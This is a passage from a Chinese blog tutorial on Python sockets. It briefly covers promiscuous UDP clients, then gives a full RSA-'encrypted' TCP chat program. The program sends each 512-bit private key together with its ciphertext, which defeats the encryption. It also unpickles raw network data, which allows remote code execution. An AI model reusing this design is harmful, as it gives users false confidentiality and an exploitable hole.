src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt=""></p></li><li><p>客户端</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF1.png" alt=""></p><p>观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端</p></li><li><p>混杂客户端</p><p>不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端</p></li></ul></li></ul></li></ul><h4 id="python-SOCKET实现RSA加密的全双工聊天程序实现"><a href="#python-SOCKET实现RSA加密的全双工聊天程序实现" class="headerlink" title="python SOCKET实现RSA加密的全双工聊天程序实现"></a>python SOCKET实现RSA加密的全双工聊天程序实现</h4><ul><li><p>题目背景</p><p>RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上</p></li><li><p>题目要点</p><ul><li><p>传输协议：TCP套接字创建客户端和服务端_</p><p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p></li><li><p>数据传输格式：pickle序列化数据</p><ul><li><p>pickle.dumps()序列化</p></li><li><p>pickle.loads()反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="number">882321</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = pickle.dumps([encryptdata,key])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(message)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bytes</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">message</span></span></span><br><span class="line"><span class="class"><span class="title">b</span>'\<span class="title">x80</span>\<span class="title">x03</span>]<span class="title">q</span>\<span class="title">x00</span><span class="params">(X\x05\x00\x00\x00helloq\x01J\x91v\r\x00e.<span class="string">'</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata = pickle.loads(message)</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">['</span>hello<span class="string">', 882321]</span></span></span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>数据加密方式：RSA加解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;data = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> rsa</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(PubKey,PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = rsa.encrypt(data.encode(),PubKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata</span><br><span class="line"><span class="string">b'=\\\x1c\x93]^(Z/\xac\x81\xfd\xffj!\x0b:r\xb0\x1b\xf9\x97VZ\xdf\xe1\x9e2\xb4\x05G4\x01\x9f\xc8\xfd\x1e\x00\xa1\xb7\xbdU\x98\xbc\x1e5\xa1yy\xee$\xcd\xf8\x10\xf4\xba\t\x84\xba\x13\x99hs\x8d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata = rsa.decrypt(encryptdata,PrivateKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata</span><br><span class="line"><span class="string">b'hello'</span></span><br></pre></td></tr></table></figure></li><li><p>题目图解</p></li></ul><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/rsa%E5%8A%A0%E5%AF%86.png" alt=""></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">PORT = <span class="number">4396</span></span><br><span class="line">BUFF = <span class="number">1024</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaEncrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 利用rsa产生公钥、私钥</span></span><br><span class="line">    (PubKey, PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line">    content = str.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="comment"># 使用公钥加密</span></span><br><span class="line">    Encrypt_Str = rsa.encrypt(content, PubKey)</span><br><span class="line">    <span class="comment"># 返回加密信息和私钥</span></span><br><span class="line">    <span class="keyword">return</span> (Encrypt_Str, PrivateKey)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaDecrypt</span><span class="params">(str, pk)</span>:</span></span><br><span class="line">    Decrypt_Str = rsa.decrypt(str, pk)</span><br><span class="line">    Decrypt_Str_1 = Decrypt_Str.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> Decrypt_Str_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        SendData = input()</span><br><span class="line">        <span class="comment"># 加密要发送的数据</span></span><br><span class="line">        (encryptdata, PrivateKey) = RsaEncrypt(SendData)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印加密后的数据</span></span><br><span class="line">        print(<span class="string">'encrypted data is '</span> + str(encryptdata))</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># pickel封装加密后的数据和私钥</span></span><br><span class="line">        Message = pickle.dumps([encryptdata, PrivateKey])</span><br><span class="line">        <span class="keyword">if</span> len(SendData) &gt; <span class="number">0</span>:</span><br><span class="line">            Sock.send(Message)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecvMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收数据</span></span><br><span class="line">        Message = Sock.recv(BUFF)</span><br><span class="line">        <span class="comment"># pickle解封数据</span></span><br><span class="line">        (recvdata, PrivateKey) = pickle.loads(Message)</span><br><span class="line">        <span class="comment"># 对加密的数据解密</span></span><br><span class="line">        decryptdata = RsaDecrypt(recvdata, PrivateKey)</span><br><span class="line">        <span class="keyword">if</span> len(Message)&gt;<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"receive message:"</span> + decryptdata)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    type = input(<span class="string">'please input server or client:'</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'server'</span>:</span><br><span class="line">        <span class="comment"># 创建套接字</span></span><br><span class="line">        ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment"># 端口绑定</span></span><br><span class="line">        ServerSock.bind((<span class="string">'127.0.0.1'</span>,PORT))</span><br><span class="line"><span class="comment"># 服务器允许连接的个数</span></span><br><span class="line">        ServerSock.listen(<span class="number">5</span>)</span><br><span class="line">        print(<span class="string">"listening......"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ConSock,addr = ServerSock.accept()</span><br><span class="line">            print(<span class="string">'connection succeed'</span> + <span class="string">'\n'</span> + <span class="string">'you can chat online'</span>)</span><br><span class="line">            <span class="comment"># 多线程运用</span></span><br><span class="line">            thread_1 = threading.Thread(target = SendMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_1.start()</span><br><span class="line">            thread_2.start()</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'client'</span>:</span><br><span class="line">        ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        ServerAddr = input(<span class="string">"please input the server's ip address:"</span>)</span><br><span class="line">        ClientSock.connect((ServerAddr, PORT))</span><br><span class="line">        print(<span class="string">'connection succeed, chat start!'</span>)</span><br><span class="line">        thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_3.start()</span><br><span class="line">        thread_4.start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>结果演示</p><ul><li><p>先启动server进行监听</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serverlisten.png" alt=""></p></li><li><p>启动客户端连接server</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/client.png" alt=""></p></li><li><p>客户端向服务器发送消息</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/clientsend.png" alt=""></p></li><li><p>服务器端接收到消息，并将消息打印在屏幕上</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serversend.png" alt=""></p></li></ul></li><li><p>分析</p><p>综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
